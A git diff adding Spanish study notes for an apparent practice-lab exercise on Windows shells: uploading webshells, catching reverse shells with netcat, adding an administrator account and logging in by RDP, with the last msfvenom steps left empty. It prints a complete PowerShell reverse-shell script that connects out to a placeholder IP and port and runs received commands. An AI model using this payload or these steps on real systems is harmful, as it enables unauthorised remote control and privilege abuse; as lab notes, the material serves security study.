@@ -3,3 +3,62 @@ layout: apunte
 title: "15. Windows Practice Box"
 ---
 
+1. Prueba a activar la `php-reverse-shell`. ¿Funciona?
+	1. Subimos la shell.
+	   !**Pasted image 20251125195020.png**
+	2. Nos ponemos en escucha.
+	   !**Pasted image 20251125195258.png**
+	3. Activamos la shell y esperamos la conexión.
+	   !**Pasted image 20251125195423.png**
+	   **No se puede.**
+2. Sube una webshell y obtén una reverse shell usando Powershell.
+	1. Subimos la shell.
+	   !**Pasted image 20251125195633.png**
+	2. Nos ponemos en escucha.
+	   !**Pasted image 20251125195258.png**
+	3. Cargamos la shell y le metemos el comando que vimos en la tarea 11.
+	   !**Pasted image 20251125195844.png**
+	4. Esperamos la conexión.
+	   !**Pasted image 20251125200010.png**
+3. El servidor web está corriendo con permisos SYSTEM. Crea un nuevo usuario y añádelo al grupo "administrators", luego inicia sesión por RDP o WinRM.
+	1. Añadimos el usuario nuevo y lo metemos al grupo de administradores.
+	   !**Pasted image 20251125200148.png**
+	2. Inicio sesión con RDP.
+	   !**Pasted image 20251125200457.png**
+4. Experimenta usando socat y netcat para obtener reverse y bind shells en el objetivo Windows.
+	1. Netcat reverse shell.
+	   !**Pasted image 20251125211653.png**
+	2. Vamos a probar socat.
+	   !**Pasted image 20251125211713.png**
+	   Tampoco va, pero podíamos subir un socat en binario precompilado.
+	3. Vamos a subirlo.
+	   !**Pasted image 20251125212356.png**
+	4. Ya lo tenemos en la máquina.
+	   !**Pasted image 20251125212702.png**
+	5. No nos deja.
+	   !**Pasted image 20251125213058.png**
+	6. Puede que tengamos que iniciar sesión como administrador.
+	   No era eso.
+	7. Vamos a subir el siguiente archivo y lo llamaremos `reverse.ps1`:
+	   
+	    ```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PUERTO>);
+$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush();
+};
+$client.Close();
+```  
+	   
+	    !**Pasted image 20251125214017.png**
+5. Crea una shell Meterpreter Windows 64 bits usando msfvenom y súbelo al objetivo. Activa la shell y captúrala con el multi/handler.
+	1. 
+6. Crea una shell Meterpreter staged y uno stageless. Intenta capturarlas con netcat. ¿Funciona?
+
+
+ 
